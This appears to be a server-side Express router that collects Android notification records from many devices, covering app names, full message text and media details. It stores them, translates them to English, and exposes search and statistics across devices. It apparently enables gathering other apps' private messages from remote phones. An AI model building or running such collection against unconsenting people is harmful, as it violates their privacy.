const express = require('express');
const router = express.Router();
const Notification = require('../models/Notification');
const { authenticateApiKey } = require('../middleware/auth');
const translationService = require('../services/translationService');
const deviceService = require('../services/deviceService');
const { translateNotificationText } = require('../utils/translationUtil');

// POST /api/notifications - Save notification
router.post('/', authenticateApiKey, async (req, res) => {
    try {
        // Log full payload received
        console.log('📩 Received notification payload:', JSON.stringify(req.body, null, 2));

        const {
            uniqueId,
            notificationId,
            deviceId,
            packageName,
            appName,
            channelId,
            completeMessage,
            completeNotificationText,
            key,
            isGroup,
            isGroupConversation,
            isGroupSummary,
            hasMedia,
            mediaType,
            mediaUri,
            mediaFileName,
            mediaSize,
            mediaMimeType,
            mediaUploaded,
            mediaServerPath,
            mediaDownloadUrl,
            messages,
            postTime,
            whenTime,
            text
        } = req.body;

        // Validate required fields
        if (!uniqueId || !notificationId || !deviceId || !packageName || !appName || !key) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: uniqueId, notificationId, deviceId, packageName, appName, key'
            });
        }

        // Create notification data with only required fields
        const notificationData = {
            uniqueId: uniqueId,
            notificationId: notificationId,
            deviceId: deviceId,
            packageName: packageName,
            appName: appName,
            channelId: channelId || '',
            completeMessage: completeMessage || '',
            completeNotificationText: completeNotificationText || '',
            key: key,
            isGroup: isGroup || false,
            isGroupConversation: isGroupConversation || false,
            isGroupSummary: isGroupSummary || false,
            hasMedia: hasMedia || false,
            mediaType: mediaType || '',
            mediaUri: mediaUri || '',
            mediaFileName: mediaFileName || '',
            mediaSize: Number.isFinite(Number(mediaSize)) ? Number(mediaSize) : 0,
            mediaMimeType: mediaMimeType || '',
            mediaUploaded: mediaUploaded || false,
            mediaServerPath: mediaServerPath || '',
            mediaDownloadUrl: mediaDownloadUrl || '',
            messages: Array.isArray(messages) ? messages : [],
            postTime: postTime || Date.now(),
            whenTime: whenTime || Date.now(),
            text: text || ''
        };

        // Create new notification (no upsert - always save new)
        const savedNotification = new Notification(notificationData);
        await savedNotification.save();

        // Translate completeNotificationText to English using Groq
        try {
            const translationResult = await translateNotificationText(completeNotificationText || '');
            if (translationResult.success && !translationResult.isEnglish) {
                savedNotification.completeNotificationTextEN = translationResult.translation;
                await savedNotification.save();
                console.log('✅ Translated notification text to English using Groq');
            } else if (translationResult.success && translationResult.isEnglish) {
                savedNotification.completeNotificationTextEN = completeNotificationText || '';
                await savedNotification.save();
                console.log('✅ Notification text is already in English');
            }
        } catch (translationError) {
            console.error('❌ Failed to translate notification:', translationError.message);
        }

        // Update device stats asynchronously (do not block response)
        deviceService.incrementDeviceStats(deviceId, { totalNotifications: 1 }).catch((error) => {
            console.error('❌ Failed to increment device notification count:', error.message);
        });

        res.status(201).json({
            success: true,
            message: 'Notification saved successfully',
            data: {
                id: savedNotification._id,
                uniqueId: savedNotification.uniqueId,
                notificationId: savedNotification.notificationId,
                deviceId: savedNotification.deviceId,
                packageName: savedNotification.packageName,
                appName: savedNotification.appName,
                completeMessage: savedNotification.completeMessage,
                completeNotificationText: savedNotification.completeNotificationText,
                completeNotificationTextEN: savedNotification.completeNotificationTextEN,
                title: savedNotification.title,
                text: savedNotification.text,
                hasMedia: savedNotification.hasMedia,
                messages: savedNotification.messages,
                createdAt: savedNotification.createdAt,
                updatedAt: savedNotification.updatedAt
            }
        });

    } catch (error) {
        console.error('Error saving notification:', error);
        
        res.status(500).json({
            success: false,
            message: 'Failed to save notification',
            error: error.message
        });
    }
});

const escapeRegExp = (value) => value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

const buildSearchConditions = (search) => {
    if (!search || typeof search !== 'string') return [];
    const tokens = search.split(/\s+/).filter(Boolean);
    if (tokens.length === 0) return [];

    const fields = [
        'title',
        'text',
        'completeMessage',
        'completeNotificationText',
        'completeNotificationTextEN',
        'messages'
    ];

    const conditions = [];
    tokens.forEach((token) => {
        const regex = new RegExp(escapeRegExp(token), 'i');
        fields.forEach((field) => {
            conditions.push({ [field]: regex });
        });
    });

    return conditions;
};

// GET /api/notifications - Get all notifications
router.get('/', authenticateApiKey, async (req, res) => {
    try {
        const {
            deviceId,
            packageName,
            limit = 100,
            skip = 0,
            page,
            offset,
            search
        } = req.query;
        
        let query = {};
        if (deviceId) query.deviceId = deviceId;
        if (packageName) query.packageName = packageName;

        const searchConditions = buildSearchConditions(search);
        if (searchConditions.length > 0) {
            query.$or = searchConditions;
        }
        
        // Support both skip and offset parameters, and page-based pagination
        let skipValue = parseInt(skip) || 0;
        if (page && limit) {
            skipValue = (parseInt(page) - 1) * parseInt(limit);
        } else if (offset) {
            skipValue = parseInt(offset);
        }
        
        const limitValue = parseInt(limit) || 100;
        
        // Get total count for pagination
        const totalCount = await Notification.countDocuments(query);
        
        const notifications = await Notification.find(query)
            .sort({ createdAt: -1 })
            .limit(limitValue)
            .skip(skipValue);
        
        // Get device information for each notification
        const notificationsWithDeviceInfo = await Promise.all(
            notifications.map(async (notification) => {
                const deviceResult = await deviceService.getDeviceById(notification.deviceId);
                const deviceInfo = deviceResult.success ? deviceResult.device : null;
                
                return {
                    ...notification.toObject(),
                    deviceInfo: deviceInfo ? {
                        deviceModel: deviceInfo.deviceModel,
                        deviceBrand: deviceInfo.deviceBrand,
                        androidVersion: deviceInfo.androidVersion,
                        lastSeen: deviceInfo.lastSeen
                    } : null
                };
            })
        );
        
        res.json({
            success: true,
            data: notificationsWithDeviceInfo,
            count: notificationsWithDeviceInfo.length,
            totalCount: totalCount
        });
        
    } catch (error) {
        console.error('Error fetching notifications:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch notifications',
            error: error.message
        });
    }
});

// GET /api/notifications/metadata - Get distinct devices and packages
router.get('/metadata', authenticateApiKey, async (req, res) => {
    try {
        const [devices, packages, apps] = await Promise.all([
            Notification.distinct('deviceId'),
            Notification.distinct('packageName'),
            Notification.distinct('appName')
        ]);

        res.json({
            success: true,
            data: {
                devices: devices.sort(),
                packages: packages.sort(),
                apps: apps.sort()
            }
        });
    } catch (error) {
        console.error('Error fetching notification metadata:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch notification metadata',
            error: error.message
        });
    }
});

// GET /api/notifications/stats - Get notification statistics
router.get('/stats', authenticateApiKey, async (req, res) => {
    try {
        const { deviceId } = req.query;
        
        let matchQuery = {};
        if (deviceId) matchQuery.deviceId = deviceId;
        
        const stats = await Notification.aggregate([
            { $match: matchQuery },
            {
                $group: {
                    _id: null,
                    totalNotifications: { $sum: 1 },
                    totalWithMedia: { $sum: { $cond: ['$hasMedia', 1, 0] } },
                    uniqueApps: { $addToSet: '$packageName' },
                    uniqueDevices: { $addToSet: '$deviceId' }
                }
            },
            {
                $project: {
                    _id: 0,
                    totalNotifications: 1,
                    totalWithMedia: 1,
                    uniqueAppsCount: { $size: '$uniqueApps' },
                    uniqueDevicesCount: { $size: '$uniqueDevices' }
                }
            }
        ]);
        
        res.json({
            success: true,
            data: stats[0] || {
                totalNotifications: 0,
                totalWithMedia: 0,
                uniqueAppsCount: 0,
                uniqueDevicesCount: 0
            }
        });
        
    } catch (error) {
        console.error('Error fetching notification stats:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch notification statistics',
            error: error.message
        });
    }
});

// POST /api/notifications/translate/:id - Translate notification
router.post('/translate/:id', authenticateApiKey, async (req, res) => {
    try {
        const notificationId = req.params.id;
        
        const notification = await Notification.findById(notificationId);
        if (!notification) {
            return res.status(404).json({
                success: false,
                message: 'Notification not found'
            });
        }

        const translationResult = await translateNotificationText(notification.completeNotificationText || '');
        
        if (!translationResult.success) {
            return res.status(400).json({
                success: false,
                message: 'Translation failed',
                error: translationResult.error
            });
        }

        res.json({
            success: true,
            data: {
                notificationId: notificationId,
                originalText: notification.text || notification.completeMessage,
                originalLanguage: translationResult.originalLanguage,
                translation: translationResult.translation,
                isEnglish: translationResult.isEnglish,
                cached: translationResult.cached || false
            }
        });

    } catch (error) {
        console.error('Error translating notification:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to translate notification',
            error: error.message
        });
    }
});

module.exports = router;